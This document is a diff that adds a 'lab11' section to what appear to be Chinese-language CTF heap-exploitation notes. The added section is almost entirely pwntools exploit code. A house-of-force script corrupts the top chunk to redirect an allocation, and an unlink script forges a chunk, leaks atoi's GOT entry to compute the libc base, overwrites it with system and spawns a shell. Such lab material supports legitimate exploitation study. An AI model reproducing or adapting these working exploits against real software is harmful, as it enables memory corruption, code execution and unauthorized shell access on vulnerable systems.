@@ -449,3 +449,68 @@ printf 的参数不在栈上了
     r.interactive()
 
 ```
+
+# lab11
+
+* house of force
+
+```
+    additem(0x100,'aaaa')              
+    modify(0,0x110,'a'*0x100+p64(0)+'\xff'*8)                                  
+
+    #top-target=(0x10+0x10)+(0x10+0x100)=0x130                                 
+    #top+(evil_size+0x10)=target => evil_size=-0x140                           
+    evil_size=-0x140                   
+    additem(evil_size,"bbbb")          
+
+    magic = 0x400d49                   
+    additem(0x20,p64(magic)*2)         
+
+    ru(':')                            
+    sl('5')                            
+    r.interactive()
+```
+
+* unlink
+
+```
+    def genfake(ptr_node1_addr,node1_buff_size,next_node_buff_size,x64=True):
+        arch_bytes = 8 if x64 else 4
+        pack_fun = p64 if x64 else p32
+  
+        p0 = pack_fun(0x0)
+        p1 = pack_fun(node1_buff_size + 0x01)
+        p2 = pack_fun(ptr_node1_addr - 3 * arch_bytes)
+        p3 = pack_fun(ptr_node1_addr - 2 * arch_bytes)
+        #finally,ptr_node1_addr = ptr_node1_addr - 3
+        node2_pre_size = pack_fun(node1_buff_size)
+        node2_size = pack_fun(next_node_buff_size+2*arch_bytes)
+        return p0 + p1 + p2 + p3 + "".ljust(node1_buff_size - 4 * arch_bytes, '1') + node2_pre_size + node2_size
+    
+    
+    ptr_node=0x6020c8
+    
+    additem(0x100,'aaaa')
+    additem(0x100,'aaaa')
+    additem(0x100,'aaaa')#2
+    additem(0x100,'aaaa')
+    additem(0x100,'aaaa')#4
+    additem(0x100,'aaaa')
+    modify(3,0x110,genfake(ptr_node+3*2*8,0x100,0x100))
+    remove(4)
+    modify(3,0x10,p64(0x100)+p64(elf.got['atoi']))
+    show()
+    res=ru('choice')
+    t=re.findall(r'2 : .*3 ',res)[0]
+    t=t[4:len(t)-2]
+    info(repr(t))
+    atoi_real=u64(t+'\x00'*(8-len(t)))
+    info(hex(atoi_real))
+    libc_base=atoi_real-libc.symbols['atoi']
+    system=libc_base+libc.symbols['system']
+    modify(2,0x8,p64(system))
+
+    ru(':')
+    sl('sh')
+    r.interactive()
+```
